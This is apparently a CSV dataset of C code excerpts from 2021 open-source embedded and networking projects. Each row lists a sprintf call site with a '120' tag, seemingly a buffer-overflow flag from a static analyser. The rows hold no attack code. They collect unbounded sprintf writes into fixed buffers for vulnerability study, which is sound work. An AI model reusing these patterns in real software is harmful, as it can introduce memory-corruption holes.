2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\bk7231t_os\beken378\driver\usb\src\systems\none\afs\board.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\bk7231t_os\beken378\driver\usb\src\systems\none\afs\board.c,"sprintf(number, fmt, dwNumber);",120,1,"    fmt[1] = (char)0;
    strcat(fmt, format);
    sprintf(number, fmt, dwNumber);

    return MUSB_BoardMessageString(pMsg, wBufSize, number);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\bk7231t_os\beken378\func\joint_up\role_launch.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\bk7231t_os\beken378\func\joint_up\role_launch.c,"sprintf(temp, ""%02x"", psk[i]);",120,1,"	for(i = 0; i < 32; i++)
	{
		sprintf(temp, ""%02x"", psk[i]);
		strcat(bssid_info.psk, temp);
	}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\gpio_test.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_common\src\gpio_test.c,"ptemp += sprintf(ptemp, ""%d"", gpio_test_table.group[idx].iopin[i]);",120,1,"
            for(i = 0; i < gpio_test_table.group[idx].ionum; i++) {
                ptemp += sprintf(ptemp, ""%d"", gpio_test_table.group[idx].iopin[i]);
                *ptemp ++ = ',';
            }
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_os_adapter\src\system\tuya_hal_system.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231t\platforms\bk7231t\tuya_os_adapter\src\system\tuya_hal_system.c,"sprintf(serial_no,""%02x%02x%02x%02x%02x%02x"",mac1.mac[0],mac1.mac[1],\",120,1,"
    memset(serial_no,'\0',sizeof(serial_no));
    sprintf(serial_no,""%02x%02x%02x%02x%02x%02x"",mac1.mac[0],mac1.mac[1],\
            mac1.mac[2],mac1.mac[3],mac1.mac[4],mac1.mac[5]);

"
2021\univ-csProject\Network Implement\tcp_chat\chat_cli.c,Dataset Download,../../Dataset Download/2021\univ-csProject\Network Implement\tcp_chat\chat_cli.c,"sprintf(name, ""[%s]"", argv[3]);",120,1,"		}
							
		sprintf(name, ""[%s]"", argv[3]);
		sock=socket(PF_INET, SOCK_STREAM, 0);
									
"
2021\univ-csProject\Network Implement\tcp_chat\chat_cli.c,Dataset Download,../../Dataset Download/2021\univ-csProject\Network Implement\tcp_chat\chat_cli.c,"sprintf(name_msg,""%s %s"", name, msg);",120,1,"				exit(0);
			}
			sprintf(name_msg,""%s %s"", name, msg);
			write(sock, name_msg, strlen(name_msg));
		}
"
2021\univ-csProject\Network Implement\tcp_chat\tcp_chatcli.c,Dataset Download,../../Dataset Download/2021\univ-csProject\Network Implement\tcp_chat\tcp_chatcli.c,"sprintf(bufall, ""[%s] : "", argv[3]);",120,1,"	}

	sprintf(bufall, ""[%s] : "", argv[3]);
	namelen = strlen(bufall);
	bufmsg = bufall + namelen;
"
2021\weaver\firmware\src\wifi.c,Dataset Download,../../Dataset Download/2021\weaver\firmware\src\wifi.c,"sprintf(command_buffer, ""AT+CWJAP=\""%s\"",\""%s\""\r\n"",",120,1,"
	case WIFI_NETWORK_CONNECT:
		sprintf(command_buffer, ""AT+CWJAP=\""%s\"",\""%s\""\r\n"",
				WIFI_NETWORK_SSID, WIFI_NETWORK_PASSWORD);

"
2021\weaver\firmware\src\wifi.c,Dataset Download,../../Dataset Download/2021\weaver\firmware\src\wifi.c,"sprintf(command_buffer, ""AT+CIPSTART=\""TCP\"",\""%s\"",%s\r\n"",",120,1,"
	case WIFI_MQTT_CONNECT:
		sprintf(command_buffer, ""AT+CIPSTART=\""TCP\"",\""%s\"",%s\r\n"",
				MQTT_BROKER_ADDRESS,MQTT_BROKER_PORT);

"
2021\weaver\firmware\src\wifi.c,Dataset Download,../../Dataset Download/2021\weaver\firmware\src\wifi.c,"sprintf(command_buffer, ""AT+CIPSEND=%d\r\n"", payload_size);",120,1,"	case WIFI_MQTT_PUBLISH_START:
		payload_size = create_payload(payload);
		sprintf(command_buffer, ""AT+CIPSEND=%d\r\n"", payload_size);

		if (!send_command(command_buffer))
"
2021\weaver\firmware\src\wifi.c,Dataset Download,../../Dataset Download/2021\weaver\firmware\src\wifi.c,"sprintf(json, ""{temperature:%.2f, humidity:%.2f, pressure:%.2f, tvoc:%d, eco2:%d}"",",120,1,"
	char json[128];
	sprintf(json, ""{temperature:%.2f, humidity:%.2f, pressure:%.2f, tvoc:%d, eco2:%d}"",
			environmental_data.temperature,
			environmental_data.humidity,
"
2021\weaver\firmware\src\wifi.c,Dataset Download,../../Dataset Download/2021\weaver\firmware\src\wifi.c,"sprintf(payload, ""POST /api/v1/%s/telemetry HTTP/1.1\r\n""",120,1,"			air_quality.eco2);

	sprintf(payload, ""POST /api/v1/%s/telemetry HTTP/1.1\r\n""
			""Host: 192.168.0.218:8080\r\n""
			""Content-Type:application/json\r\n""
"
2021\wio-terminal-azure-sample\src\main.cpp,Dataset Download,../../Dataset Download/2021\wio-terminal-azure-sample\src\main.cpp,"sprintf(resultBuff, ""{\""Result\"":\""\""}"");",120,1,"
    char resultBuff[16];
    sprintf(resultBuff, ""{\""Result\"":\""\""}"");
    *response_size = strlen(resultBuff);
    *response = (unsigned char *)malloc(*response_size);
"
2021\wio-terminal-azure-sample\src\ntp.h,Dataset Download,../../Dataset Download/2021\wio-terminal-azure-sample\src\ntp.h,"sprintf(buff, ""%.f"", difftime(epochTime, (time_t)0));",120,1,"
            char buff[32];
            sprintf(buff, ""%.f"", difftime(epochTime, (time_t)0));
            Serial.println(buff);
            break;
"
2021\x-cube-subg2\Drivers\CMSIS\DSP\DSP_Lib_TestSuite\Common\JTest\inc\jtest_fw.h,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Drivers\CMSIS\DSP\DSP_Lib_TestSuite\Common\JTest\inc\jtest_fw.h,"sprintf(JTEST_FW.str_buffer,format_str, __VA_ARGS__);           \",120,1,"    {                                                                   \
        JTEST_CLEAR_STR_BUFFER();                                       \
        sprintf(JTEST_FW.str_buffer,format_str, __VA_ARGS__);           \
        jtest_dump_str_segments();                                      \
    } while (0)
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\lib\dbg-io\sprintf.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\lib\dbg-io\sprintf.c,"sprintf(char *str, const char *format, ...)",120,1,"/*---------------------------------------------------------------------------*/
int
sprintf(char *str, const char *format, ...)
{
  strformat_context_t ctxt;
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\http-socket\http-socket.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\http-socket\http-socket.c,"sprintf(str, ""%u"", s->postdatalen);",120,1,"        }
        tcp_socket_send_str(tcps, ""Content-Length: "");
        sprintf(str, ""%u"", s->postdatalen);
        tcp_socket_send_str(tcps, str);
        tcp_socket_send_str(tcps, ""\r\n"");
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\http-socket\http-socket.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\http-socket\http-socket.c,"sprintf(str, ""%llu-%llu"",",120,1,"        if(s->length) {
          if(s->pos >= 0) {
            sprintf(str, ""%llu-%llu"",
              (long long unsigned int)s->pos, (long long unsigned int)s->pos + s->length - 1);
          } else {
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\http-socket\http-socket.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\http-socket\http-socket.c,"sprintf(str, ""-%llu"", (long long unsigned int)s->length);",120,1,"              (long long unsigned int)s->pos, (long long unsigned int)s->pos + s->length - 1);
          } else {
            sprintf(str, ""-%llu"", (long long unsigned int)s->length);
          }
        } else {
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\http-socket\http-socket.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\http-socket\http-socket.c,"sprintf(str, ""%llu-"", (long long unsigned int)s->pos);",120,1,"          }
        } else {
          sprintf(str, ""%llu-"", (long long unsigned int)s->pos);
        }
        tcp_socket_send_str(tcps, str);
"
2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\http-socket\websocket-http-client.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Middlewares\Third_Party\Contiki-NG\os\net\app-layer\http-socket\websocket-http-client.c,"sprintf(buf, ""%d"", s->port);",120,1,"  tcp_socket_send_str(tcps, s->host);
  tcp_socket_send_str(tcps, "":"");
  sprintf(buf, ""%d"", s->port);
  tcp_socket_send_str(tcps, buf);
  tcp_socket_send_str(tcps, "" HTTP/1.1\r\n"");
"
2021\x-cube-subg2\Utilities\PC_Software\Contiki-NG\serial-io\tunslip6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Utilities\PC_Software\Contiki-NG\serial-io\tunslip6.c,"sprintf(lladdr,""fe80::%x:%x:%x:%x"",a[1]&0xfefd,a[2],a[3],a[7]);",120,1,"      }
    }
    sprintf(lladdr,""fe80::%x:%x:%x:%x"",a[1]&0xfefd,a[2],a[3],a[7]);
    if (timestamp) stamptime();
    ssystem(""ifconfig %s add %s/64"", tundev, lladdr);
"
2021\x-cube-subg2\Utilities\PC_Software\wpcapslip6\wpcap6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Utilities\PC_Software\wpcapslip6\wpcap6.c,"wsprintf(buffer, ""%02X-%02X-%02X-%02X-%02X-%02X"",",120,1,"
	if (adapters->PhysicalAddressLength == 6) {
		wsprintf(buffer, ""%02X-%02X-%02X-%02X-%02X-%02X"",
		 adapters->PhysicalAddress[0], adapters->PhysicalAddress[1],
		 adapters->PhysicalAddress[2], adapters->PhysicalAddress[3],
"
2021\x-cube-subg2\Utilities\PC_Software\wpcapslip6\wpcapslip6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Utilities\PC_Software\wpcapslip6\wpcapslip6.c,"sprintf(macs48,""%02X-%02X-%02X-%02X-%02X-%02X"",",120,1,"                      dev_eth_addr.addr[i] = addr_bytes[i+2];
                  }
                  sprintf(macs48,""%02X-%02X-%02X-%02X-%02X-%02X"",
                            dev_eth_addr.addr[0],
                            dev_eth_addr.addr[1],
"
2021\x-cube-subg2\Utilities\PC_Software\wpcapslip6\wpcapslip6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Utilities\PC_Software\wpcapslip6\wpcapslip6.c,"sprintf(buf,""%02X"",adapter_eth_addr.addr[i]);",120,1,"
		for(i=0; i < 6; i++){
			sprintf(buf,""%02X"",adapter_eth_addr.addr[i]);
			slip_send(buf[0]);
			slip_send(buf[1]);
"
2021\x-cube-subg2\Utilities\PC_Software\wpcapslip6\wpcapslip6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Utilities\PC_Software\wpcapslip6\wpcapslip6.c,"sprintf(buf,""%02d"",channel);",120,1,"			slip_send('C');
			
			sprintf(buf,""%02d"",channel);
			slip_send(buf[0]);
			slip_send(buf[1]);
"
2021\x-cube-subg2\Utilities\PC_Software\wpcapslip6\wpcapslip6.c,Dataset Download,../../Dataset Download/2021\x-cube-subg2\Utilities\PC_Software\wpcapslip6\wpcapslip6.c,"sprintf(siodev,""ttyS%d"",portnum-1);",120,1,"				err(1,""port number is invalid"");
			}
			sprintf(siodev,""ttyS%d"",portnum-1);
		}
		else {
"
2021\zhbox\src\main.c,Dataset Download,../../Dataset Download/2021\zhbox\src\main.c,"sprintf(pid_file, PID_FILE, PROG);",120,1,"    if (get_opt(argc, argv)) { return (-1); }

    sprintf(pid_file, PID_FILE, PROG);
    if (check_pid(pid_file)) {
        old_pid = read_pid(pid_file);
"
2021\zhbox\src\main.c,Dataset Download,../../Dataset Download/2021\zhbox\src\main.c,"sprintf(out_file, OUT_FILE, PROG);",120,1,"
    open(""/dev/null"", O_RDWR);
    sprintf(out_file, OUT_FILE, PROG);
    open(out_file, O_WRONLY|O_CREAT|O_TRUNC, 0600);
    open(out_file, O_WRONLY|O_CREAT|O_TRUNC, 0600);
"
2021\zhbox\src\mqtt.h,Dataset Download,../../Dataset Download/2021\zhbox\src\mqtt.h,"if(!strncmp(""addr"", key, keylen)){ return sprintf(dptr, ""%s"", this->addr); }\",120,1,"{\
    OBJGETBASESTRINGVAR(this, key, keylen, dptr);\
    if(!strncmp(""addr"", key, keylen)){ return sprintf(dptr, ""%s"", this->addr); }\
    if(!strncmp(""port"", key, keylen)){ return sprintf(dptr, ""%d"", this->port); }\
    if(!strncmp(""clientid"", key, keylen)){ return sprintf(dptr, ""%s"", this->clientid); }\
"
2021\zhbox\src\mqtt.h,Dataset Download,../../Dataset Download/2021\zhbox\src\mqtt.h,"if(!strncmp(""port"", key, keylen)){ return sprintf(dptr, ""%d"", this->port); }\",120,1,"    OBJGETBASESTRINGVAR(this, key, keylen, dptr);\
    if(!strncmp(""addr"", key, keylen)){ return sprintf(dptr, ""%s"", this->addr); }\
    if(!strncmp(""port"", key, keylen)){ return sprintf(dptr, ""%d"", this->port); }\
    if(!strncmp(""clientid"", key, keylen)){ return sprintf(dptr, ""%s"", this->clientid); }\
    if(!strncmp(""usr"", key, keylen)){ return sprintf(dptr, ""%s"", this->usr); }\
"
2021\zhbox\src\mqtt.h,Dataset Download,../../Dataset Download/2021\zhbox\src\mqtt.h,"if(!strncmp(""clientid"", key, keylen)){ return sprintf(dptr, ""%s"", this->clientid); }\",120,1,"    if(!strncmp(""addr"", key, keylen)){ return sprintf(dptr, ""%s"", this->addr); }\
    if(!strncmp(""port"", key, keylen)){ return sprintf(dptr, ""%d"", this->port); }\
    if(!strncmp(""clientid"", key, keylen)){ return sprintf(dptr, ""%s"", this->clientid); }\
    if(!strncmp(""usr"", key, keylen)){ return sprintf(dptr, ""%s"", this->usr); }\
    if(!strncmp(""pwd"", key, keylen)){ return sprintf(dptr, ""%s"", this->pwd); }\
"
2021\zhbox\src\mqtt.h,Dataset Download,../../Dataset Download/2021\zhbox\src\mqtt.h,"if(!strncmp(""usr"", key, keylen)){ return sprintf(dptr, ""%s"", this->usr); }\",120,1,"    if(!strncmp(""port"", key, keylen)){ return sprintf(dptr, ""%d"", this->port); }\
    if(!strncmp(""clientid"", key, keylen)){ return sprintf(dptr, ""%s"", this->clientid); }\
    if(!strncmp(""usr"", key, keylen)){ return sprintf(dptr, ""%s"", this->usr); }\
    if(!strncmp(""pwd"", key, keylen)){ return sprintf(dptr, ""%s"", this->pwd); }\
    if(!strncmp(""count"", key, keylen)){ return sprintf(dptr, ""%d"", this->count); }\
"
2021\zhbox\src\mqtt.h,Dataset Download,../../Dataset Download/2021\zhbox\src\mqtt.h,"if(!strncmp(""pwd"", key, keylen)){ return sprintf(dptr, ""%s"", this->pwd); }\",120,1,"    if(!strncmp(""clientid"", key, keylen)){ return sprintf(dptr, ""%s"", this->clientid); }\
    if(!strncmp(""usr"", key, keylen)){ return sprintf(dptr, ""%s"", this->usr); }\
    if(!strncmp(""pwd"", key, keylen)){ return sprintf(dptr, ""%s"", this->pwd); }\
    if(!strncmp(""count"", key, keylen)){ return sprintf(dptr, ""%d"", this->count); }\
} while (0)
"
2021\zhbox\src\mqtt.h,Dataset Download,../../Dataset Download/2021\zhbox\src\mqtt.h,"if(!strncmp(""count"", key, keylen)){ return sprintf(dptr, ""%d"", this->count); }\",120,1,"    if(!strncmp(""usr"", key, keylen)){ return sprintf(dptr, ""%s"", this->usr); }\
    if(!strncmp(""pwd"", key, keylen)){ return sprintf(dptr, ""%s"", this->pwd); }\
    if(!strncmp(""count"", key, keylen)){ return sprintf(dptr, ""%d"", this->count); }\
} while (0)

"
2021\zhbox\src\N_ali.c,Dataset Download,../../Dataset Download/2021\zhbox\src\N_ali.c,"if(!strncmp(""SignMethod"", key, keylen)){ return sprintf(dptr, ""%s"", this->signmethod); }\",120,1,"    OPCUAGETBASESTRINGVAR(this, key, keylen, dptr);\
    ALIDEVGETBASESTRINGVAR(this, key, keylen, dptr);\
    if(!strncmp(""SignMethod"", key, keylen)){ return sprintf(dptr, ""%s"", this->signmethod); }\
    if(!strncmp(""clientId"", key, keylen)){ return sprintf(dptr, ""%s"", this->clientid); }\
    if(!strncmp(""sign"", key, keylen)){ return sprintf(dptr, ""%s"", this->sign); }\
"
2021\zhbox\src\N_ali.c,Dataset Download,../../Dataset Download/2021\zhbox\src\N_ali.c,"if(!strncmp(""clientId"", key, keylen)){ return sprintf(dptr, ""%s"", this->clientid); }\",120,1,"    ALIDEVGETBASESTRINGVAR(this, key, keylen, dptr);\
    if(!strncmp(""SignMethod"", key, keylen)){ return sprintf(dptr, ""%s"", this->signmethod); }\
    if(!strncmp(""clientId"", key, keylen)){ return sprintf(dptr, ""%s"", this->clientid); }\
    if(!strncmp(""sign"", key, keylen)){ return sprintf(dptr, ""%s"", this->sign); }\
} while (0)
"
2021\zhbox\src\N_ali.c,Dataset Download,../../Dataset Download/2021\zhbox\src\N_ali.c,"if(!strncmp(""sign"", key, keylen)){ return sprintf(dptr, ""%s"", this->sign); }\",120,1,"    if(!strncmp(""SignMethod"", key, keylen)){ return sprintf(dptr, ""%s"", this->signmethod); }\
    if(!strncmp(""clientId"", key, keylen)){ return sprintf(dptr, ""%s"", this->clientid); }\
    if(!strncmp(""sign"", key, keylen)){ return sprintf(dptr, ""%s"", this->sign); }\
} while (0)

"
2021\zhbox\src\N_ali.h,Dataset Download,../../Dataset Download/2021\zhbox\src\N_ali.h,"if(!strncmp(""ProductKey"", key, keylen)){ return sprintf(dptr, ""%s"", this->productkey); }\",120,1,"{\
    OBJGETBASESTRINGVAR(this, key, keylen, dptr);\
    if(!strncmp(""ProductKey"", key, keylen)){ return sprintf(dptr, ""%s"", this->productkey); }\
    if(!strncmp(""DeviceName"", key, keylen)){ return sprintf(dptr, ""%s"", this->devicename); }\
    if(!strncmp(""DeviceSecret"", key, keylen)){ return sprintf(dptr, ""%s"", this->devicesecret); }\
"
2021\zhbox\src\N_ali.h,Dataset Download,../../Dataset Download/2021\zhbox\src\N_ali.h,"if(!strncmp(""DeviceName"", key, keylen)){ return sprintf(dptr, ""%s"", this->devicename); }\",120,1,"    OBJGETBASESTRINGVAR(this, key, keylen, dptr);\
    if(!strncmp(""ProductKey"", key, keylen)){ return sprintf(dptr, ""%s"", this->productkey); }\
    if(!strncmp(""DeviceName"", key, keylen)){ return sprintf(dptr, ""%s"", this->devicename); }\
    if(!strncmp(""DeviceSecret"", key, keylen)){ return sprintf(dptr, ""%s"", this->devicesecret); }\
    if(!strncmp(""LoginMilliSecond"", key, keylen)){ return sprintf(dptr, ""%"" PRId64, this->loginmillisecond); }\
"
2021\zhbox\src\N_ali.h,Dataset Download,../../Dataset Download/2021\zhbox\src\N_ali.h,"if(!strncmp(""DeviceSecret"", key, keylen)){ return sprintf(dptr, ""%s"", this->devicesecret); }\",120,1,"    if(!strncmp(""ProductKey"", key, keylen)){ return sprintf(dptr, ""%s"", this->productkey); }\
    if(!strncmp(""DeviceName"", key, keylen)){ return sprintf(dptr, ""%s"", this->devicename); }\
    if(!strncmp(""DeviceSecret"", key, keylen)){ return sprintf(dptr, ""%s"", this->devicesecret); }\
    if(!strncmp(""LoginMilliSecond"", key, keylen)){ return sprintf(dptr, ""%"" PRId64, this->loginmillisecond); }\
} while (0)
"
2021\zhbox\src\N_ali.h,Dataset Download,../../Dataset Download/2021\zhbox\src\N_ali.h,"if(!strncmp(""LoginMilliSecond"", key, keylen)){ return sprintf(dptr, ""%"" PRId64, this->loginmillisecond); }\",120,1,"    if(!strncmp(""DeviceName"", key, keylen)){ return sprintf(dptr, ""%s"", this->devicename); }\
    if(!strncmp(""DeviceSecret"", key, keylen)){ return sprintf(dptr, ""%s"", this->devicesecret); }\
    if(!strncmp(""LoginMilliSecond"", key, keylen)){ return sprintf(dptr, ""%"" PRId64, this->loginmillisecond); }\
} while (0)

"
2021\zhbox\src\N_ali.h,Dataset Download,../../Dataset Download/2021\zhbox\src\N_ali.h,"if(!strncmp(""RegionId"", key, keylen)){ return sprintf(dptr, ""%s"", this->regionid); }\",120,1,"    MQTTGETBASESTRINGVAR(this, key, keylen, dptr);\
    ALIDEVGETBASESTRINGVAR(this, key, keylen, dptr);\
    if(!strncmp(""RegionId"", key, keylen)){ return sprintf(dptr, ""%s"", this->regionid); }\
    if(!strncmp(""DeviceId"", key, keylen)){ return sprintf(dptr, ""%s"", this->deviceid); }\
    if(!strncmp(""Mode"", key, keylen)){ return sprintf(dptr, ""%d"", this->mode); }\
"
2021\zhbox\src\N_ali.h,Dataset Download,../../Dataset Download/2021\zhbox\src\N_ali.h,"if(!strncmp(""DeviceId"", key, keylen)){ return sprintf(dptr, ""%s"", this->deviceid); }\",120,1,"    ALIDEVGETBASESTRINGVAR(this, key, keylen, dptr);\
    if(!strncmp(""RegionId"", key, keylen)){ return sprintf(dptr, ""%s"", this->regionid); }\
    if(!strncmp(""DeviceId"", key, keylen)){ return sprintf(dptr, ""%s"", this->deviceid); }\
    if(!strncmp(""Mode"", key, keylen)){ return sprintf(dptr, ""%d"", this->mode); }\
    if(!strncmp(""SignMethod"", key, keylen)){ return sprintf(dptr, ""%s"", this->signmethod); }\
"
2021\zhbox\src\N_ali.h,Dataset Download,../../Dataset Download/2021\zhbox\src\N_ali.h,"if(!strncmp(""Mode"", key, keylen)){ return sprintf(dptr, ""%d"", this->mode); }\",120,1,"    if(!strncmp(""RegionId"", key, keylen)){ return sprintf(dptr, ""%s"", this->regionid); }\
    if(!strncmp(""DeviceId"", key, keylen)){ return sprintf(dptr, ""%s"", this->deviceid); }\
    if(!strncmp(""Mode"", key, keylen)){ return sprintf(dptr, ""%d"", this->mode); }\
    if(!strncmp(""SignMethod"", key, keylen)){ return sprintf(dptr, ""%s"", this->signmethod); }\
} while (0)
"
2021\zhbox\src\obj.h,Dataset Download,../../Dataset Download/2021\zhbox\src\obj.h,"if(!strncmp(""objtype"", key, keylen)){ return sprintf(dptr, ""%s"", this->objtypestr); }\",120,1,"#define OBJGETBASESTRINGVAR(this, key, keylen, dptr) do\
{\
    if(!strncmp(""objtype"", key, keylen)){ return sprintf(dptr, ""%s"", this->objtypestr); }\
    if(!strncmp(""name"", key, keylen)){ return sprintf(dptr, ""%s"", this->name); }\
    if(!strncmp(""timestamp"", key, keylen)){ return sprintf(dptr, ""%d"", (int32_t)time(NULL)); }\
"
2021\zhbox\src\obj.h,Dataset Download,../../Dataset Download/2021\zhbox\src\obj.h,"if(!strncmp(""name"", key, keylen)){ return sprintf(dptr, ""%s"", this->name); }\",120,1,"{\
    if(!strncmp(""objtype"", key, keylen)){ return sprintf(dptr, ""%s"", this->objtypestr); }\
    if(!strncmp(""name"", key, keylen)){ return sprintf(dptr, ""%s"", this->name); }\
    if(!strncmp(""timestamp"", key, keylen)){ return sprintf(dptr, ""%d"", (int32_t)time(NULL)); }\
    if(!strncmp(""milliseconds"", key, keylen)){ return sprintf(dptr, ""%"" PRId64, this->m_getmilliseconds()); }\
"
2021\zhbox\src\obj.h,Dataset Download,../../Dataset Download/2021\zhbox\src\obj.h,"if(!strncmp(""timestamp"", key, keylen)){ return sprintf(dptr, ""%d"", (int32_t)time(NULL)); }\",120,1,"    if(!strncmp(""objtype"", key, keylen)){ return sprintf(dptr, ""%s"", this->objtypestr); }\
    if(!strncmp(""name"", key, keylen)){ return sprintf(dptr, ""%s"", this->name); }\
    if(!strncmp(""timestamp"", key, keylen)){ return sprintf(dptr, ""%d"", (int32_t)time(NULL)); }\
    if(!strncmp(""milliseconds"", key, keylen)){ return sprintf(dptr, ""%"" PRId64, this->m_getmilliseconds()); }\
} while (0)
"
2021\zhbox\src\obj.h,Dataset Download,../../Dataset Download/2021\zhbox\src\obj.h,"if(!strncmp(""milliseconds"", key, keylen)){ return sprintf(dptr, ""%"" PRId64, this->m_getmilliseconds()); }\",120,1,"    if(!strncmp(""name"", key, keylen)){ return sprintf(dptr, ""%s"", this->name); }\
    if(!strncmp(""timestamp"", key, keylen)){ return sprintf(dptr, ""%d"", (int32_t)time(NULL)); }\
    if(!strncmp(""milliseconds"", key, keylen)){ return sprintf(dptr, ""%"" PRId64, this->m_getmilliseconds()); }\
} while (0)

"
